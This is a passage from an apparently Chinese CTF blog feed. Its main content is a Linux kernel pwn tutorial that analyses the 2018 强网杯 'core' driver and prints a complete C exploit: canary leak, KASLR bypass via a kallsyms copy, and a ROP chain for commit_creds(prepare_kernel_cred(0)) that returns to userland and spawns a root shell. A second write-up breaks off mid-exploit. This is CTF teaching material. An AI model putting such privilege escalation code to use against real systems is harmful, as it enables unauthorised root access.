class="hljs-type">const</span> <span class="hljs-type">char</span> *arg, <span class="hljs-type">char</span> * <span class="hljs-type">const</span> envp[])</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">execv</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">char</span> *<span class="hljs-type">const</span> argv[])</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">execvp</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *file, <span class="hljs-type">char</span> *<span class="hljs-type">const</span> argv[])</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">execvpe</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *file, <span class="hljs-type">char</span> *<span class="hljs-type">const</span> argv[], <span class="hljs-type">char</span> *<span class="hljs-type">const</span> envp[])</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">execveat</span><span class="hljs-params">(<span class="hljs-type">int</span> dirfd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *pathname, <span class="hljs-type">char</span> *<span class="hljs-type">const</span> argv[], <span class="hljs-type">char</span> *<span class="hljs-type">const</span>  envp[], <span class="hljs-type">int</span> flags)</span>;<br></code></pre></td></tr></table></figure><h3 id="不太优雅的方法">不太优雅的方法</h3><p>nop 掉 free</p><p>把free的plt表改成ret</p><p>nop 掉 malloc</p><p>增加代码，在读的字节中过滤一些特殊的字符</p><p>打乱got表</p><h3 id="tips">tips</h3><p>随机应变，一切需要加逻辑的patch都可以把代码放<code>.eh_frame</code>段里。</p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IDA_patch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kernel pwn入门</title>
    <link href="/2023/02/05/kernel%E5%85%A5%E9%97%A8/"/>
    <url>/2023/02/05/kernel%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="前言：">前言：</h2><h2 id="01-kernel-rop">01.kernel rop</h2><h3 id="2018-强网杯-core">2018 强网杯 - core</h3><h4 id="0x01文件分析">0x01文件分析</h4><p>下载附件，有四个文件</p><p>bzImage是压缩gzip压缩的内核文件</p><p>core.cpio是压缩的文件系统</p><p>start.sh是启动脚本</p><p>vmlinux是静态编译未压缩的内核文件</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/2018core1-1684501921223.png" alt="2018core1"></p><p>我们可以从vmlinux中寻找gadget</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">time ropper --file ./vmlinux --nocolor &gt; g1<br></code></pre></td></tr></table></figure><p>当然题目没有vmlinux的话，我们可以用 <a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">extract-vmlinux</a> 解压bzImage</p><p>使用方法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./extract-vmlinux ./bzImage &gt; vmlinux<br></code></pre></td></tr></table></figure><h5 id="1-观察start-sh">1.观察start. sh</h5><p>应该要知道开启了kaslr保护，然后那个-m要改内存从64到128，不然无法启动</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/2018core2-1684501921223.png" alt="2018core2"></p><h5 id="2-解压-cpio观察init">2.解压.cpio观察init</h5><p>解压前要先加.gz后缀，不然gunzip无法识别</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir core<br>cd core<br>mv ../core.cpio core.cpio.gz<br>gunzip ./core.cpio.gz<br>cpio -idm &lt; ./core.cpio<br></code></pre></td></tr></table></figure><p>可以看到就是挂载一些目录，我们把poweroff定时120关机给注释掉，方便调试</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/2018core3-1684501921223.png" alt="2018core3"></p><p><strong>要特别注意的语句：</strong></p><p><code>cat /proc/kallsyms &gt; /tmp/kallsyms</code></p><p>把 <code>kallsyms</code> 的内容保存到了 <code>/tmp/kallsyms</code> 中</p><p><code>echo 1 &gt; /proc/sys/kernel/kptr_restrict</code></p><p>kptr_restrict设为1，就不能通过/proc/kallsyms查看内核符号的地址，但是前一句已经把它写入了/tmp/kallsyms</p><p><code>echo 1 &gt; /proc/sys/kernel/dmesg_restrict</code></p><p>dmesg_restrict设为1后，无特权的用户是无法使用dmesg查看来自内核日志缓冲区的消息</p><p><code>insmod /core.ko</code></p><p>可以看到<code>insmod</code>命令载入了core.ko模块，重点关注这模块</p><h5 id="3-观察驱动core-ko">3.观察驱动core.ko</h5><p>开启了canary</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/2018core4-1684501921223.png" alt="2018core4"></p><p><strong>ida拿出来分析</strong></p><p>__int64 init_module()创建了/porc/core</p><p>exit_core()删除了创建的core</p><p>__int64 __fastcall core_ioctl()有三个选项，分别调用 <strong>core_read()</strong>，<strong>core_copy_func()</strong> 和设置全局变量 <strong>off</strong></p><p><strong>core_read():</strong></p><p>这个函数是往&amp;v5[off]写0x40长度到用户空间</p><p>但是off我们能控制，能泄露指定地址</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/2018core5-1684501921223.png" alt="2018core5"></p><p><strong>core_copy_func():</strong></p><p>qmemcpy(v2,&amp;name,(unsigned_int16)a1)</p><p>就是把全局变量name拷贝a1长度到局部变量v2</p><p>可以看到我们传的a1是int64，而qmemcpy用的是强转的unsigned int16</p><p>我们输一个大负数绕过前面63检测，而强转后变为一个合理的够长的长度，可以造成栈溢出</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/2018core6-1684501921223.png" alt="2018core6"></p><p><strong>core_write():</strong></p><p>可以往全局变量name里写a2地址上小于等于0x800长度的值，</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/2018core7-1684501921223.png" alt="2018core7"></p><h4 id="0x02攻击步骤">0x02攻击步骤</h4><p>1.保存用户态寄存器值</p><p>2.获取<code>prepare_kernel_cred</code>，<code>commit_creds</code>的地址</p><p>3.泄露<code>canary</code></p><p>4.栈溢出写入<code>rop</code>执行<code>commit_creds(prepare_kernel_cred(0))</code>，获得root后着陆回用户态起shell</p><h4 id="0x03调试方法">0x03调试方法</h4><p><a href="https://x3h1n.github.io/2019/07/04/2018%E5%BC%BA%E7%BD%91%E6%9D%AF-core/">参考</a></p><p>start.sh启动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /sys/module/core/sections/.text<br></code></pre></td></tr></table></figure><p>在qemu中查找core.ko的.text段的地址</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/2018core11-1684501921223.png" alt="2018core11"></p><p>启动自己解压缩bzimage里面的./vmlinux</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo gdb ./vmlinux -q<br></code></pre></td></tr></table></figure><p>接着<code>add-symbol-file ./core.ko 0xffffffffc0345000</code></p><p>载入core.ko的符号地址</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">add-symbol-file ./core.ko 0xffffffffc0345000</span><br>add symbol table from file &quot;./core.ko&quot; at<br>.text_addr = 0xffffffffc0345000<br>Reading symbols from ./core.ko...<br>(No debugging symbols found in ./core.ko)<br></code></pre></td></tr></table></figure><p>然后连接端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">target remote localhost:1234<br></code></pre></td></tr></table></figure><p>我们就能断点函数名了，配合命令continue,然后运行程序就能停在指定函数</p><h4 id="0x04exp">0x04exp</h4><p><strong>解释下rop部分：</strong></p><p>这部分执行完后rax变为了prepare_kernel_cred_addr-&gt;0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">rop[i++] = <span class="hljs-number">0xffffffff81000b2f</span> + offset; <span class="hljs-comment">// pop rdi; ret</span><br>rop[i++] = <span class="hljs-number">0</span>;<br>rop[i++] = prepare_kernel_cred_addr;         <span class="hljs-comment">// prepare_kernel_cred(0)</span><br>    <br></code></pre></td></tr></table></figure><p>假设定这部分rop链为1，2，3</p><p>pop rdx使rdx=rop2，接着ret到rop2</p><p>pop rcx使rcx=rop3，接着ret到rop3</p><p>mov rdi,rax使rdi=prepare_kernel_cred_addr-&gt;0，然后call rdx，也就是跳转到rop2</p><p>pop rcx使rcx=rop3，接着ret就是执行commit_creds_addr了（rdi已经控制为了prepare_kernel_cred_addr-&gt;0）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">rop[i++] = <span class="hljs-number">0xffffffff810a0f49</span> + offset; <span class="hljs-comment">// pop rdx; ret  1</span><br>rop[i++] = <span class="hljs-number">0xffffffff81021e53</span> + offset; <span class="hljs-comment">// pop rcx; ret  2</span><br>rop[i++] = <span class="hljs-number">0xffffffff8101aa6a</span> + offset; <span class="hljs-comment">// mov rdi, rax; call rdx;  3</span><br>rop[i++] = commit_creds_addr;<br></code></pre></td></tr></table></figure><p>接着就是用swapgs，iretq着陆回用户态，起shell</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">rop[i++] = <span class="hljs-number">0xffffffff81a012da</span> + offset; <span class="hljs-comment">// swapgs; popfq; ret</span><br>rop[i++] = <span class="hljs-number">0</span>;<br>rop[i++] = <span class="hljs-number">0xffffffff81050ac2</span> + offset; <span class="hljs-comment">// iretq; ret; </span><br>rop[i++] = (<span class="hljs-type">size_t</span>)spawn_shell;         <span class="hljs-comment">// rip </span><br>rop[i++] = user_cs;<br>rop[i++] = user_rflags;<br>rop[i++] = user_sp;<br>rop[i++] = user_ss;<br></code></pre></td></tr></table></figure><p>rop：padding–&gt;canary-&gt;commit_creds(prepare_kernel_cred(0))-&gt;swapgs-&gt;iretq-&gt;system(“”/bin/sh&quot;)</p><p><strong>完整exp：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc get_root.c -static -masm=intel -g -o get_root</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-type">size_t</span> user_cs,user_ss,user_sp,user_rflags;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov user_cs,cs;&quot;</span><br>        <span class="hljs-string">&quot;mov user_ss,ss;&quot;</span><br>        <span class="hljs-string">&quot;mov user_sp,rsp;&quot;</span><br>        <span class="hljs-string">&quot;pushf;&quot;</span><br>        <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>    );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful saved status!\033[0m\n&quot;</span>);<br><br>&#125;<br><br><span class="hljs-comment">//in order to find the symbols of &quot;commit_creds,prepare_kernel_cred&quot;</span><br><span class="hljs-type">size_t</span> vmlinux_base=<span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> commit_creds_addr=<span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> prepare_kernel_cred_addr=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">find_symbols</span><span class="hljs-params">()</span><br>&#123;<br>    FILE* kallsyms_fd = fopen(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!kallsyms_fd)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m[X]open /tmp/kallsyms error!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful open /tmp/kallsyms!\033[0m\n&quot;</span>);<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x50</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>        <br><br>    <span class="hljs-keyword">while</span>(fgets(buf,<span class="hljs-number">0x50</span>,kallsyms_fd))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(buf,<span class="hljs-string">&quot;commit_creds&quot;</span>))<br>        &#123;<br>            <span class="hljs-type">char</span> s[<span class="hljs-number">0x11</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>            <span class="hljs-built_in">strncpy</span>(s,buf,<span class="hljs-number">0x10</span>);<br>            <span class="hljs-built_in">sscanf</span>(s, <span class="hljs-string">&quot;%llx&quot;</span>, &amp;commit_creds_addr);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+] commit_creds symbols addr=%p\033[0m\n&quot;</span>,commit_creds_addr);<br>            <br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(buf,<span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))<br>        &#123;<br>            <span class="hljs-type">char</span> s[<span class="hljs-number">0x10</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>            <span class="hljs-built_in">strncpy</span>(s,buf,<span class="hljs-number">0x10</span>);<br>            <span class="hljs-built_in">sscanf</span>(s, <span class="hljs-string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred_addr);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+] prepare_kernel_cred symbols addr=%p\033[0m\n&quot;</span>,prepare_kernel_cred_addr);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>((commit_creds_addr&amp;prepare_kernel_cred_addr))<br>    &#123;<br>        vmlinux_base=commit_creds_addr<span class="hljs-number">-0x9c8e0</span>;<br>    &#125;   <br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_off</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">long</span> <span class="hljs-type">long</span> idx)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+]set off to %lx\033[0m\n&quot;</span>,idx);<br>    <br><br>    ioctl(fd, <span class="hljs-number">0x6677889C</span>, idx);<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> *buf)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+]read to buf.\033[0m\n&quot;</span>);<br>    <br><br>    ioctl(fd, <span class="hljs-number">0x6677889B</span>, buf);<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_copy_func</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">long</span> <span class="hljs-type">long</span> size)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+]copy from user with size: %lx\033[0m\n&quot;</span>,size);<br>    ioctl(fd, <span class="hljs-number">0x6677889A</span>, size);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">spawn_shell</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(!getuid())<br>    &#123;<br>        system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    save_status();<br>    find_symbols();<br>    <span class="hljs-type">size_t</span> raw_vmlinux_base = <span class="hljs-number">0xffffffff81000000</span>;<br>    <span class="hljs-type">ssize_t</span> offset=vmlinux_base-raw_vmlinux_base;<span class="hljs-comment">//ssize_t=long int,size_t=unsign int</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+] offest=%lx\033[0m\n&quot;</span>,offset);<br><br>    <span class="hljs-type">int</span> fd=open(<span class="hljs-string">&quot;/proc/core&quot;</span>,<span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span>(fd&lt;<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m[X]open /proc/core error!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    set_off(fd, <span class="hljs-number">0x40</span>);<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x40</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    core_read(fd, buf);<br>    <span class="hljs-type">size_t</span> canary = ((<span class="hljs-type">size_t</span> *)buf)[<span class="hljs-number">0</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+]canary=%p\033[0m\n&quot;</span>,canary);<br>    <br>    <span class="hljs-type">size_t</span> rop[<span class="hljs-number">0x1000</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++)<br>    &#123;<br>        rop[i] = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (i==<span class="hljs-number">8</span>)rop[i]=canary;<br>    &#125;<br>    rop[i++] = <span class="hljs-number">0xffffffff81000b2f</span> + offset; <span class="hljs-comment">// pop rdi; ret</span><br>    rop[i++] = <span class="hljs-number">0</span>;<br>    rop[i++] = prepare_kernel_cred_addr;         <span class="hljs-comment">// prepare_kernel_cred(0)</span><br>    <br>    rop[i++] = <span class="hljs-number">0xffffffff810a0f49</span> + offset; <span class="hljs-comment">// pop rdx; ret</span><br>    rop[i++] = <span class="hljs-number">0xffffffff81021e53</span> + offset; <span class="hljs-comment">// pop rcx; ret</span><br>    rop[i++] = <span class="hljs-number">0xffffffff8101aa6a</span> + offset; <span class="hljs-comment">// mov rdi, rax; call rdx; </span><br>    rop[i++] = commit_creds_addr;<br>    <br>    rop[i++] = <span class="hljs-number">0xffffffff81a012da</span> + offset; <span class="hljs-comment">// swapgs; popfq; ret</span><br>    rop[i++] = <span class="hljs-number">0</span>;<br>    <br>    rop[i++] = <span class="hljs-number">0xffffffff81050ac2</span> + offset; <span class="hljs-comment">// iretq; ret; </span><br>    <br>    rop[i++] = (<span class="hljs-type">size_t</span>)spawn_shell;         <span class="hljs-comment">// rip </span><br>    <br>    rop[i++] = user_cs;<br>    rop[i++] = user_rflags;<br>    rop[i++] = user_sp;<br>    rop[i++] = user_ss;<br>    <br>    write(fd, rop, <span class="hljs-number">0x800</span>);<br>    core_copy_func(fd, <span class="hljs-number">0xffffffffffff0000</span> | (<span class="hljs-number">0x100</span>));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/2018coreROOT-1684501921223.png" alt="2018coreROOT"></p><h3 id="2023-catctf-kernel-test">2023 catctf kernel-test</h3><h4 id="0x1保护">0x1保护</h4><p>显然保护只开启kaslr，不过有<code>cat /proc/kallsyms &gt; /tmp/kallsyms</code>白给函数地址</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/11-1684501192455.png" alt="11"></p><p>没有开启smep/smap</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/5-1684501192455.png" alt="5"></p><p><code>cat /sys/devices/system/cpu/vulnerabilities/*</code>没有开启KPTI</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/6-1684501192455.png" alt="6"></p><h4 id="0x2分析">0x2分析</h4><p>惯例看漏洞驱动<code>HRPKO.ko</code></p><p>init注册设备/dev/test</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/7-1684501192455.png" alt="7"></p><p>read读特定内存给用户，可用来泄露canary</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/8-1684501192455.png" alt="8"></p><p>write把用户内存读到内核全局变量pwn</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/9-1684501192455.png" alt="9"></p><p>ioctl把全局变量pwn拷贝到leak，明显的栈溢出</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/10-1684501192455.png" alt="10"></p><h4 id="0x3思路">0x3思路</h4><p>到这里思路就很明朗了</p><p>读取文件/tmp/kallsyms得到commit_creds_addr，prepare_kernel_cred_addr地址，过kalsr</p><p>read泄露canary</p><p>write写rop到全局变量pwn</p><p>ioctl溢出执行rop（ret2usr即可）</p><h4 id="0x4Exp">0x4Exp</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span 